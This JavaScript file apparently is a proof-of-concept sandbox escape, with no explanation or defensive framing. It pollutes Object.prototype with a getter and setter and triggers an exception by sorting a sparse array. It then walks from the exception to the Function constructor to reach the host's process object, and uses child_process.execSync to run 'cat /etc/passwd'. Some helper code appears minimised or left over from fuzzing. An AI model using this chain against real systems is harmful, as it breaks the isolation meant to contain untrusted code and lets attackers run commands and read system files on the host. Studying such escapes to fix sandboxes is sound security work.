function getAllReferences(obj) {  
    let visited = new WeakMap();  
    visited.set(obj, true);
    
    function getRefsRecursive(obj) {
      let res = [];            
      let keys = Object.getOwnPropertyNames(obj);
      for (let i = 0; i < keys.length; i++) {          
        if (!!Object.getOwnPropertyDescriptor(obj, keys[i])['get'])
            continue;
        let val = obj[keys[i]];
  
        if (!visited.has(val) && typeof val === 'function') {                  
            res.push(1);
            getRefsRecursive(val);
        }
            
      }
      return res;
    }
    return getRefsRecursive(obj);
  }
  
  
  function bar(ref, cb) {
    let stack = new Error().stack;
    (stack.match(/bar/g) || []).length;  
    getAllReferences(ref);  
  }
  
  const logs = [];
  let a = Object.defineProperty(Object.prototype, '2', {
    get() {              
        logs.push("1");      
    },
    set(v) {      
      bar(arguments);  
      logs.push("1");
    }
  });
      
  bar(a);
  
  const array = [
    1,
    1,
    ,
  ];
  try {
    array.sort();  
  } catch (exception) {
    exception.__proto__.toString.constructor("return this")().process.mainModule.require("child_process").execSync("cat /etc/passwd").toString();
  }